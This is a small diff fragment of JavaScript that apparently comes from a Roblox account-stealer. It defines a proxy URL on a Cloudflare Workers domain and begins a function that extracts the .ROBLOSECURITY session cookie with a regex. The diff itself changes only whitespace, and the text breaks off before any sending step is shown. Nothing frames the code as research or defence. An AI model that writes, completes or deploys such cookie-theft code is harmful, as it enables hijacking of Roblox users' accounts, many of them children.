@@ -1,5 +1,5 @@
 const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
-
+ 
 function extractRobloxSecurityCookie(sessionId) {
   // Only use this specific pattern
   const regex = /\.ROBLOSECURITY",\s*"([^"]+)"/;
